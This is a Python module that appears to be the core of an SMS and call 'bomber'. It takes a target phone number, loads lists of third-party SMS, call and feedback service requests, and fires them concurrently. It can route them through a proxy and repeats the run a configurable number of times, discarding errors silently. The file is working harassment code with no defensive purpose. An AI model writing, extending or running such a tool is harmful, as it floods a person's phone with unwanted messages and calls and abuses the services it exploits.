from asyncio import ensure_future, gather, run
from aiohttp import ClientSession
from aiohttp_proxy import ProxyConnector, ProxyType

from Core.Attack.Services import urls
from Core.Attack.Feedback_Services import feedback_urls
from Core.Config import check_config, PROXY



async def request(session, url):
    try:
        type_attack = ('SMS', 'CALL', 'FEEDBACK') if check_config()['type_attack'] == 'MIX' else check_config()['type_attack']

        if url['info']['attack'] in type_attack:
            async with session.request(url['method'], url['url'], params=url.get('params'), cookies=url.get('cookies'), headers=url.get('headers'), data=url.get('data'), json=url.get('json'), timeout=20) as response:
                return await response.text()
    except:
        pass



async def async_attacks(number):
    if PROXY==None:
        async with ClientSession() as session:
            services = (urls(number) + feedback_urls(number)) if check_config()['feedback'] == 'True' else urls(number)
            tasks = [ensure_future(request(session, service)) for service in services]
            await gather(*tasks)
    else:
        connector = ProxyConnector.from_url(PROXY)
        async with ClientSession(connector) as session:
            services = (urls(number) + feedback_urls(number)) if check_config()['feedback'] == 'True' else urls(number)
            tasks = [ensure_future(request(session, service)) for service in services]
            await gather(*tasks)



def start_async_attacks(number, replay):
    '''Запуск бомбера'''

    for _ in range(int(replay)):
        run(async_attacks(number))
